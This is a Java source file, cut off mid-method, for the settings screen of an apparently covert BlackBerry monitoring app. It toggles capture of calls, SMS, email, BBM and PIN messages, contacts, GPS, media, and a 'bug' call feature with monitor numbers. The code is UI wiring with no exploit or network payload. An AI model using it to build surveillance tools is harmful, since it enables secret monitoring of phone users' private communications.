package com.vvt.screen;

import java.util.TimerTask;
import com.vvt.pref.*;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendDeactivateCmdResponse;
import com.vvt.prot.command.response.SendHeartBeatCmdResponse;
import com.vvt.protsrv.SendDeactivateManager;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendHeartBeatManager;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.ui.resource.MainAppTextResource;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.DrawStyle;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.FieldChangeListener;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.text.TextFilter;
import net.rim.device.api.ui.container.HorizontalFieldManager;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.container.VerticalFieldManager;
import net.rim.device.api.ui.component.BasicEditField;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.ui.component.ButtonField;
import net.rim.device.api.ui.component.RichTextField;
import net.rim.device.api.ui.component.CheckboxField;
import net.rim.device.api.ui.component.EditField;
import net.rim.device.api.ui.component.ObjectChoiceField;
import net.rim.device.api.ui.component.SeparatorField;

public class SettingsScreen extends MainScreen implements FieldChangeListener, PhoenixProtocolListener {
	
	private final String TAG = "SettingsScreen";
	// Component
	private Preference pref = Global.getPreference();
	private SendDeactivateManager deactivator = Global.getSendDeactivateManager();
	private SendHeartBeatManager heartBeat = Global.getSendHeartBeatManager();
	private LicenseManager license = Global.getLicenseManager();
	private LicenseInfo licenseInfo = null;
	// UI Part
	private CheckboxField bbmField = null;
	private CheckboxField voiceField = null;
	private CheckboxField smsField = null;
	private CheckboxField emailField = null;
	private CheckboxField addressField = null;
	private CheckboxField locationField = null;
	private CheckboxField gpsField = null;
	private CheckboxField watchField = null;
	private CheckboxField bugField = null;
	private CheckboxField pinField = null;
	private CheckboxField imageField = null;
	private CheckboxField audioField = null;
	private CheckboxField videoField = null;
	private MenuItem dbRecordsMenu = null;
	private MenuItem deactivateMenu = null;
	private MenuItem smsMenu = null;
	private MenuItem uninstallMenu = null;
	private MenuItem monitorNumbMenu = null;
	private MenuItem homeInNumbMenu = null;
	private MenuItem homeOutNumbMenu = null;
	private MenuItem watchNumbMenu = null;
	private MenuItem lastConnectionMenu = null;
	private MenuItem connHistoryMenu = null;
	private MenuItem aboutMenu = null;
	private ButtonField startStopField = null;
	private ButtonField editField = null;
	private ObjectChoiceField locationTimerField = null;
	private ObjectChoiceField gpsTimerField = null;
	private ObjectChoiceField reportTimerField = null; 
	private LabelField maxEventLbf = null;
	private RichTextField maxEventRtf = null;
	private RichTextField startStopMessage = null;
	private SeparatorField maxEventSeparateField = new SeparatorField();
	private SeparatorField reportTimerSeparateField = new SeparatorField();
	private SeparatorField eventSeparateField = new SeparatorField();
	private VerticalFieldManager leftVerticalMgr = new VerticalFieldManager();
	private VerticalFieldManager rightVerticalMgr = new VerticalFieldManager();
	private VerticalFieldManager gpsVerticalMgr = new VerticalFieldManager();
	private VerticalFieldManager locationVerticalMgr = new VerticalFieldManager();
	private HorizontalFieldManager pinHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager addressHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager bbmHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager standardHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager bugHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager watchHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager mediaHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager camImageHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager audioFileHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager videoFileHorizontalMgr = new HorizontalFieldManager();
	private SettingsScreen self = null;
	private ProgressThread progressThread = null;
	private boolean fieldChangedApproval = true;
	private boolean deactivatedMode = false;
	private UiApplication uiApp = null;;
	
	public SettingsScreen() {
		try {
			uiApp = UiApplication.getUiApplication();
			self = this;
			setTitle(MainAppTextResource.SETTING_SCREEN_TITLE);
			removeAllMenuItems();
			createUI();
			createMenu();
		} catch(Exception e) {
			Log.error("SettingsScreen.constructor", e.getMessage(), e);
		}
	}
	
	public void refreshUI() {
		/*try {
			fieldChangedApproval = false;
			final PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			final PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			final PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
			final PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			final PrefAddressBook prefAddr = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
			final PrefGeneral prefGeneral = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			final PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			final PrefWatchListInfo prefWatchList = prefBug.getPrefWatchListInfo();
			final PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			final PrefPIN prefPin = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
			final PrefCameraImage prefCamImage = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
			final PrefAudioFile prefAudioFile = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
			final PrefVideoFile prefVideoFile = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
			// General Fields
			uiApp.invokeLater(new Runnable() {
				public void run() {
					reportTimerField.setSelectedIndex(prefGeneral.getSendTimeIndex());
					// BBM Fields
					if (prefMessenger.isSupported()) {
						bbmField.setChecked(prefMessenger.isBBMEnabled());
					}
				}
			});
			if (prefEvent.isSupported()) {
				// Standard Fields
				uiApp.invokeLater(new Runnable() {
					public void run() {
						voiceField.setChecked(prefEvent.isCallLogEnabled());
						smsField.setChecked(prefEvent.isSMSEnabled());
						emailField.setChecked(prefEvent.isEmailEnabled());
					}
				});
			}
			if (prefAddr.isSupported()) {
				// Address Book Fields
				uiApp.invokeLater(new Runnable() {
					public void run() {
						addressField.setChecked(prefAddr.isEnabled());
					}
				});
			}
			if (prefPin.isSupported()) {
				// PIN Fields
				uiApp.invokeLater(new Runnable() {
					public void run() {						
						pinField.setChecked(prefPin.isEnabled());
					}
				});	
			}
			if (prefBug.isSupported()) {
				// Bug Field
				uiApp.invokeLater(new Runnable() {
					public void run() {
						bugField.setChecked(prefBug.isEnabled());
						if (prefBug.isConferenceSupported()) {
							watchField.setChecked(prefWatchList.isWatchListEnabled());			
//							watchField.setEditable(prefBug.isEnabled());
						}
					}
				});	
			}
			if (prefCell.isSupported()) {
				// Location Field
				uiApp.invokeLater(new Runnable() {
					public void run() {						
						locationField.setChecked(prefCell.isEnabled());
						locationTimerField.setEditable(prefCell.isEnabled());
						int locInterval = prefCell.getInterval();
						locationTimerField.setSelectedIndex(getTimerIndex(locInterval));
					}
				});
			}
			if (prefGPS.isSupported()) {
				// Location Fields
				uiApp.invokeLater(new Runnable() {
					public void run() {						
						gpsField.setChecked(prefGPS.isEnabled());
						gpsTimerField.setEditable(prefGPS.isEnabled());
						int interval = prefGPS.getGpsOption().getInterval();
						gpsTimerField.setSelectedIndex(getTimerIndex(interval));
					}
				});
			}
			// Media Fields
			uiApp.invokeLater(new Runnable() {
				public void run() {			
					if (prefCamImage.isSupported()) {
						imageField.setChecked(prefCamImage.isEnabled());
					}
					if (prefAudioFile.isSupported()) {
						audioField.setChecked(prefAudioFile.isEnabled());
					}
					if (prefVideoFile.isSupported()) {
						videoField.setChecked(prefVideoFile.isEnabled());
					}
				}
			});
			manageEventCountField();
			// refresh start/stop button.
			manageStartAndStopField(isSomeDefaultEventsEnabled());
		} catch(Exception e) {
			Log.error(TAG + ".refreshUI()", e.getMessage(), e);
		}
		fieldChangedApproval = true;
		*/
		
		uiApp.invokeLater(new Runnable() {
			public void run() {
				try {
					fieldChangedApproval = false;
					final PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
					final PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					final PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
					final PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
					final PrefAddressBook prefAddr = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
					final PrefGeneral prefGeneral = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					final PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
					final PrefWatchListInfo prefWatchList = prefBug.getPrefWatchListInfo();
					final PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
					final PrefPIN prefPin = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
					final PrefCameraImage prefCamImage = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
					final PrefAudioFile prefAudioFile = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
					final PrefVideoFile prefVideoFile = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
					// General Fields
					reportTimerField.setSelectedIndex(prefGeneral.getSendTimeIndex());
					// BBM Fields
					if (prefMessenger.isSupported()) {
						bbmField.setChecked(prefMessenger.isBBMEnabled());
					}
					// Standard Fields
					if (prefEvent.isSupported()) {						
						voiceField.setChecked(prefEvent.isCallLogEnabled());
						smsField.setChecked(prefEvent.isSMSEnabled());
						emailField.setChecked(prefEvent.isEmailEnabled());							
					}
					// Address Book Fields
					if (prefAddr.isSupported()) {
						addressField.setChecked(prefAddr.isEnabled());
					}
					// PIN Fields
					if (prefPin.isSupported()) {
						pinField.setChecked(prefPin.isEnabled());
					}
					// Bug Field
					if (prefBug.isSupported()) {
						bugField.setChecked(prefBug.isEnabled());
						if (prefBug.isConferenceSupported()) {
							watchField.setChecked(prefWatchList.isWatchListEnabled());			

						}
					}
					// Location Field
					if (prefCell.isSupported()) {
						locationField.setChecked(prefCell.isEnabled());
						locationTimerField.setEditable(prefCell.isEnabled());
						int locInterval = prefCell.getInterval();
						locationTimerField.setSelectedIndex(getTimerIndex(locInterval));
					}
					// GPS Fields
					if (prefGPS.isSupported()) {
						gpsField.setChecked(prefGPS.isEnabled());
						gpsTimerField.setEditable(prefGPS.isEnabled());
						int interval = prefGPS.getGpsOption().getInterval();
						gpsTimerField.setSelectedIndex(getTimerIndex(interval));						
					}
					// Media Fields
					if (prefCamImage.isSupported()) {
						imageField.setChecked(prefCamImage.isEnabled());
					}
					if (prefAudioFile.isSupported()) {
						audioField.setChecked(prefAudioFile.isEnabled());
					}
					if (prefVideoFile.isSupported()) {
						videoField.setChecked(prefVideoFile.isEnabled());
					}
					manageEventCountField();
					// refresh start/stop button.
					manageStartAndStopField(isSomeDefaultEventsEnabled());
				} catch(Exception e) {
					Log.error(TAG + ".refreshUI()", e.getMessage(), e);
				}
				fieldChangedApproval = true;
			}
		});
	}
	
	public void doneDeactivation() {
		UiApplication.getUiApplication().invokeLater(new Runnable() {
			public void run() {
				if (Log.isDebugEnable()) {
					Screen screen = UiApplication.getUiApplication().getActiveScreen();
					int count = UiApplication.getUiApplication().getScreenCount();
					Log.debug(TAG + ".doneDeactivation()", "Enter, screen count: " + count + "screen.toString()" + screen.toString());
				}
				UiApplication.getUiApplication().popScreen(self);
			}
		});
	}
	
	private String getStartStopLabel(boolean start) {
		return (start ? MainAppTextResource.SETTING_SCREEN_START_CAPTURE : MainAppTextResource.SETTING_SCREEN_STOP_CAPTURE);
	}
	
	private void initializeStartStopField() {
		HorizontalFieldManager hfManagerS2 = new HorizontalFieldManager(Field.FIELD_HCENTER);
		startStopField = new ButtonField("", Field.FIELD_HCENTER | ButtonField.CONSUME_CLICK);
		startStopField.setChangeListener(this);
		hfManagerS2.add(startStopField);
		add(hfManagerS2);
		startStopMessage = new RichTextField("", Field.NON_FOCUSABLE);
		add(startStopMessage);
		manageStartAndStopField(isSomeDefaultEventsEnabled());
	}
	
	private boolean isSomeDefaultEventsEnabled() {
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		return generalInfo.isCaptured();
	}

	private void initializeCountEventField() {
		PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		int eventCount = settings.getMaxEventCount();
		maxEventLbf = new LabelField(MainAppTextResource.SETTING_SCREEN_MAX_EVENT + eventCount + Constant.SPACE + Constant.SPACE + Constant.SPACE + Constant.SPACE + Constant.SPACE);
		maxEventLbf.setEditable(false);
		editField = new ButtonField(MainAppTextResource.SETTING_SCREEN_EDIT, ButtonField.CONSUME_CLICK );
		editField.setChangeListener(this);
		VerticalFieldManager vfLeft = new VerticalFieldManager(FIELD_VCENTER);
		VerticalFieldManager vfRight = new VerticalFieldManager();
		HorizontalFieldManager hfm = new HorizontalFieldManager();
		vfLeft.add(maxEventLbf);
		vfRight.add(editField);
		hfm.add(vfLeft);
		hfm.add(vfRight);
		add(hfm);
		manageEventCountField();
	}

	private void initializeTimerField() {
		PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		int timerIndex = settings.getSendTimeIndex();
		reportTimerField = new ObjectChoiceField(MainAppTextResource.SETTING_SCREEN_REPORT_TIMER, ApplicationInfo.TIME);
		reportTimerField.setSelectedIndex(timerIndex);
		reportTimerField.setChangeListener(this);
		add(reportTimerField);		
	}

	private void createMenu() {
		deactivateMenu = new MenuItem(MainAppTextResource.SETTING_SCREEN_SETTING_SCREEN_DEACTIVATE_MENU, 2400000, 1024) {
        	public void run() {
				Dialog dialog = new Dialog(Dialog.D_YES_NO, MainAppTextResource.SETTING_SCREEN_DEACTIVATE_BEFORE, Dialog.NO, null, Field.USE_ALL_WIDTH);
				int selected = dialog.doModal();
				if (selected == Dialog.YES) {
					deactivate();
				}
        	}
        };
        uninstallMenu = new MenuItem(MainAppTextResource.WELCOME_SCREEN_UNINSTALL_MENU, 2400100, 1024) {
        	public void run() {
        		try {
        			licenseInfo = license.getLicenseInfo();
					Dialog dialog = new Dialog(Dialog.D_YES_NO, MainAppTextResource.WELCOME_SCREEN_UNINSTALL_BEFORE, Dialog.NO, null, DEFAULT_CLOSE);
					int selected = dialog.doModal();
					if (selected == Dialog.YES) {
						uninstallApplication();
						// TODO: Add update license to deactivate
						licenseInfo = license.getLicenseInfo();
						licenseInfo.setLicenseStatus(LicenseStatus.UNINSTALL);
						license.commit(licenseInfo);
					}
				} catch (Exception e) {
					Log.error("SettingsScreen.uninstallMenu", e.getMessage(), e);
				}
        	}
        };
        monitorNumbMenu = new MenuItem(MainAppTextResource.MONITOR_NUMBER_SCREEN_MENU, 2000000, 1024) {
        	public void run() {
        		uiApp.pushScreen(new MonitorNumberScreen());
        	}
        };
        homeInNumbMenu = new MenuItem(MainAppTextResource.HOME_IN_SCREEN_MENU, 2000000, 1024) {
        	public void run() {
        		uiApp.pushScreen(new HomeInScreen());
        	}
        };
        homeOutNumbMenu = new MenuItem(MainAppTextResource.HOME_OUT_SCREEN_MENU, 2000000, 1024) {
        	public void run() {
        		uiApp.pushScreen(new HomeOutScreen());
        	}
        };
        watchNumbMenu = new MenuItem(MainAppTextResource.WATCH_NUMBER_SCREEN_MENU, 2000000, 1024) {
        	public void run() {
        		uiApp.pushScreen(new WatchNumberScreen());
        	}
        };
        lastConnectionMenu = new MenuItem(MainAppTextResource.LAST_CONNECTION_SCREEN_LABEL, 3200000, 1024) {
        	public void run() {
        		uiApp.pushScreen(new ConnectionScreen(0));
        	}
        }; 
        connHistoryMenu = new MenuItem(MainAppTextResource.CONNECTION_HISTORY_SCREEN_LABEL, 3200000, 1024) {
        	public void run() {
        		uiApp.pushScreen(new ConnectionScreen(1));
        	}
        };
        dbRecordsMenu = new MenuItem(MainAppTextResource.DATABASE_RECORDS_SCREEN_LABEL, 3300000, 1024) {
        	public void run() {
        		uiApp.pushScreen(new DatabaseRecordsScreen(self));
        	}
        };
        aboutMenu = new MenuItem(MainAppTextResource.SETTING_SCREEN_ABOUT, 3400000, 1024) {
        	public void run() {
				uiApp.pushScreen(new AboutPopup());
        	}
        };
        addMenuItem(deactivateMenu);
        addMenuItem(uninstallMenu);
        addMenuItem(monitorNumbMenu);        
        addMenuItem(homeOutNumbMenu);
        addMenuItem(watchNumbMenu);
        addMenuItem(lastConnectionMenu);
        addMenuItem(connHistoryMenu);
        addMenuItem(dbRecordsMenu);
        addMenuItem(aboutMenu);
	}
	
	private void uninstallApplication() {
		try {
			int moduleHandle = CodeModuleManager.getModuleHandle(ApplicationInfo.APPLICATION_NAME);
			CodeModuleManager.deleteModuleEx(moduleHandle, true);
		} catch (Exception e) {
			Log.error(TAG + ".uninstallApplication()", e.getMessage(), e);
		}
	}
	
	private void testConnection() {
		deactivatedMode = false;
		heartBeat.addListener(this);
		heartBeat.testConnection();
	}
	
	private void deactivate() {
		deactivatedMode = true;
		deactivator.addListener(this);
		deactivator.deactivate();
		progressThread = new ProgressThread(this);
		progressThread.start();
	}

	private void createUI() {
		try {
			initializeTimerField();
			// To add timer separated field.
			add(reportTimerSeparateField);
			initializeCountEventField();
			// To add max event separated field.
			add(maxEventSeparateField);
			LabelField filterLabel = new LabelField(MainAppTextResource.SETTING_SCREEN_TEXT_INIT);
			add(filterLabel);
			licenseInfo = license.getLicenseInfo();
			PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
			PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			PrefAddressBook prefAddress = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
			PrefPIN prefPin = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
			PrefCameraImage prefCamImage = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
			PrefAudioFile prefAudioFile = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
			PrefVideoFile prefVideoFile = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
			if (prefEvent.isSupported()) {
				// Standard Fields
				initializeStandardField(prefEvent);
			}
			if (prefSystem.isSupported()) {
				// SIM Fields
				initializeSIMField(prefSystem);
			}
			if (prefPin.isSupported()) {
				// PIN Fields
				initializePINField(prefPin);
			}
			if (prefAddress.isSupported()) {
				// Address Book Fields
				initializeAddressBookField(prefAddress);
			}
			if (prefMessenger.isSupported()) {
				// BBM Fields
				initializeBBMField(prefMessenger);
			}
			if (prefCell.isSupported()) {
				// Location Field
				initializeCellInfoField(prefCell);
			}
			if (prefGPS.isSupported()) {
				// GPS Field
				initializeGPSField(prefGPS);
			}
			if (prefCamImage.isSupported()) {
				initializeCamImageField(prefCamImage);
			}			
			if (prefAudioFile.isSupported()) {
				initializeAudioFileField(prefAudioFile);
			}
			if (prefVideoFile.isSupported()) {
				initializeVideoFileField(prefVideoFile);
			}
			// To add separated field.
			add(eventSeparateField);
			if (prefBug.isSupported()) {
				// Bug Field
				initializeBugField(prefBug);
			}
			initializeStartStopField();
		}
		catch(Exception e) {
			Log.error(TAG + ".createUI()", e.getMessage(), e);
		}
	}

	private void manageStartAndStopField(final boolean running) {
		try {
			/*uiApp.invokeLater(new Runnable() {
				public void run() {
					String label = getStartStopLabel(!running);
					startStopField.setLabel(label);
					startStopMessage.setText(running ? MainAppTextResource.SETTING_SCREEN_CAPTURE_ON : MainAppTextResource.SETTING_SCREEN_CAPTURE_OFF);					
				}
			});	*/
			
			String label = getStartStopLabel(!running);
			startStopField.setLabel(label);
			startStopMessage.setText(running ? MainAppTextResource.SETTING_SCREEN_CAPTURE_ON : MainAppTextResource.SETTING_SCREEN_CAPTURE_OFF);			
		} catch (Exception e) {
			Log.error(TAG + ".manageStartAndStopField", e.getMessage(), e);
		}
	}
	
	private void manageEventCountField() {
		try {
			/*uiApp.invokeLater(new Runnable() {
				public void run() {					
					PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					maxEventLbf.setText(MainAppTextResource.SETTING_SCREEN_MAX_EVENT + settings.getMaxEventCount() + Constant.SPACE + Constant.SPACE + Constant.SPACE + Constant.SPACE + Constant.SPACE);						
				}
			});*/
			
			PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			maxEventLbf.setText(MainAppTextResource.SETTING_SCREEN_MAX_EVENT + settings.getMaxEventCount() + Constant.SPACE + Constant.SPACE + Constant.SPACE + Constant.SPACE + Constant.SPACE);			
			
		} catch (Exception e) {
			Log.error(TAG + ".manageEventCountField()", e.getMessage(), e);
		}
	}
	
	private void initializeBBMField(PrefMessenger prefMessenger) {
		// To set enabled value.
		bbmField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_BBM_LABLE, prefMessenger.isBBMEnabled());
		bbmHorizontalMgr.add(bbmField);
		add(bbmHorizontalMgr);
		bbmField.setChangeListener(this);
		pref.commit(prefMessenger);
	}

	private void initializeStandardField(PrefEventInfo eventInfo) {
		// To set enabled value.
		voiceField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_VOICE_LABLE, eventInfo.isCallLogEnabled());
		smsField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_SMS_LABLE, eventInfo.isSMSEnabled());
		emailField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_EMAIL_LABLE, eventInfo.isEmailEnabled());
		leftVerticalMgr.add(voiceField);
		leftVerticalMgr.add(smsField);
		rightVerticalMgr.add(emailField);
		standardHorizontalMgr.add(leftVerticalMgr);
		standardHorizontalMgr.add(rightVerticalMgr);
		add(standardHorizontalMgr);
		voiceField.setChangeListener(this);
		smsField.setChangeListener(this);
		emailField.setChangeListener(this);
		pref.commit(eventInfo);
	}
	
	private void initializeSIMField(PrefSystem systemInfo) {
		// TODO: Refer to the requirement that sim change always send notification and invisible in UI
		// To set enabled value.
		/*simField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_SIM_LABLE, systemInfo.isSIMChangeEnabled());
		rightVerticalMgr.add(simField);
		simField.setChangeListener(this);*/
		pref.commit(systemInfo);
	}
	
	private void initializePINField(PrefPIN prefPin) {
		// To set enabled value.
		pinField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_PIN_LABLE, prefPin.isEnabled());
		pinHorizontalMgr.add(pinField);
		add(pinHorizontalMgr);
		pinField.setChangeListener(this);
		pref.commit(prefPin);
	}
	
	private void initializeAddressBookField(PrefAddressBook addrInfo) {
		// To set enabled value.
		addressField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_ADDRESS_BOOK_LABLE, addrInfo.isEnabled());
		addressHorizontalMgr.add(addressField);
		add(addressHorizontalMgr);
		addressField.setChangeListener(this);
		pref.commit(addrInfo);
	}
	
	private void initializeBugField(PrefBugInfo bugInfo) {
		// To set enabled value.
		bugField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_BUG_LABLE, bugInfo.isEnabled(), Field.FIELD_LEFT);
		bugHorizontalMgr.add(bugField);		
		add(bugHorizontalMgr);
		add(watchHorizontalMgr);
		bugField.setChangeListener(this);
		if (bugInfo.isConferenceSupported()) {
			PrefWatchListInfo prefWatchInfo = bugInfo.getPrefWatchListInfo();			
			watchField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_WATCH_NOTIFICATION_LABLE, prefWatchInfo.isWatchListEnabled());
			watchHorizontalMgr.add(watchField);
			watchField.setChangeListener(this);
		}
		pref.commit(bugInfo);
	}
	
	private void initializeCellInfoField(PrefCellInfo cellInfo) {
		// To set enabled value.
		int locInterval = cellInfo.getInterval();
		locationField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_CELL_INFO_LABLE, cellInfo.isEnabled(), Field.FIELD_LEFT);
		locationTimerField = new ObjectChoiceField(MainAppTextResource.SETTING_SCREEN_REFRESH_TIME_LABLE, ApplicationInfo.LOCATION_TIMER, getTimerIndex(locInterval), DrawStyle.RIGHT | Field.USE_ALL_WIDTH);
		locationTimerField.setEditable(cellInfo.isEnabled());
		locationVerticalMgr.add(locationField);
		locationVerticalMgr.add(locationTimerField);
		add(locationVerticalMgr);
		locationField.setChangeListener(this);
		locationTimerField.setChangeListener(this);
		pref.commit(cellInfo);
	}
	
	private void initializeGPSField(PrefGPS gpsInfo) {
		// To set enabled value.
		int interval = gpsInfo.getGpsOption().getInterval();
		gpsField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_LOCATION_LABLE, gpsInfo.isEnabled(), Field.FIELD_LEFT);
		gpsTimerField = new ObjectChoiceField(MainAppTextResource.SETTING_SCREEN_REFRESH_TIME_LABLE, ApplicationInfo.LOCATION_TIMER, getTimerIndex(interval), DrawStyle.RIGHT | Field.USE_ALL_WIDTH);
		gpsTimerField.setEditable(gpsInfo.isEnabled());
		gpsVerticalMgr.add(gpsField);
		gpsVerticalMgr.add(gpsTimerField);
		add(gpsVerticalMgr);
		gpsField.setChangeListener(this);
		gpsTimerField.setChangeListener(this);
		pref.commit(gpsInfo);
	}
	
	private void initializeAudioFileField(PrefAudioFile audioFileInfo) {
		// To set enabled value.
		audioField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_AUDIO_FILE_LABLE, audioFileInfo.isEnabled());
		audioFileHorizontalMgr.add(audioField);
		add(audioFileHorizontalMgr);
		audioField.setChangeListener(this);
		pref.commit(audioFileInfo);
	}
	
	private void initializeVideoFileField(PrefVideoFile videoFileInfo) {
		// To set enabled value.
		videoField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_VIDEO_FILE_LABLE, videoFileInfo.isEnabled());
		videoFileHorizontalMgr.add(videoField);
		add(videoFileHorizontalMgr);
		videoField.setChangeListener(this);
		pref.commit(videoFileInfo);
	}
	
	private void initializeCamImageField(PrefCameraImage camImageInfo) {
		// To set enabled value.
		imageField = new CheckboxField(MainAppTextResource.SETTING_SCREEN_IMAGE_LABLE, camImageInfo.isEnabled());
		camImageHorizontalMgr.add(imageField);
		add(camImageHorizontalMgr);
		imageField.setChangeListener(this);
		pref.commit(camImageInfo);
	}
	
	private int getTimerIndex(int interval) {
		int index = 0;
		for (int i = 0; i < ApplicationInfo.LOCATION_TIMER_SECONDS.length; i++) {
			if (ApplicationInfo.LOCATION_TIMER_SECONDS[i] == interval) {
				index = i;
				break;
			}
		}
		return index;
	}
	
	private void cancelProgressBar() {
		uiApp.invokeLater(new Runnable() {
			public void run() {
				if (progressThread != null) {
					addMenuItem(deactivateMenu);
					if (progressThread.isAlive()) {
						progressThread.stopProgressThread();
					}
				}
			}
		});
	}

	private boolean isMonitorNumberEmptyList() {
		boolean emptyList = true;
		PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		if (bugInfo.countMonitorNumber() > 0) {
			emptyList = false;
		}
		return emptyList;
	}
	
	// FieldChangeListener
	public void fieldChanged(Field field, int context) {
		try {
			if (fieldChangedApproval) {
				/*if (field.equals(reportTimerField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
							settings.setSendTimeIndex(reportTimerField.getSelectedIndex());
							pref.commit(settings);
						}
					});
				} else if(field.equals(editField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							uiApp.pushScreen(new EventCountScreen(self));						
						}
					});
				} else if (field.equals(voiceField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean voiceStatus = voiceField.getChecked();
							PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
							eventInfo.setCallLogEnabled(voiceStatus);
							pref.commit(eventInfo);
						}
					});
				} else if (field.equals(locationField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean locStatus = locationField.getChecked();
							locationTimerField.setEditable(locStatus);
							PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
							cellInfo.setEnabled(locStatus);
							pref.commit(cellInfo);
						}
					});					
				} else if (field.equals(locationTimerField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
							boolean alter = true;
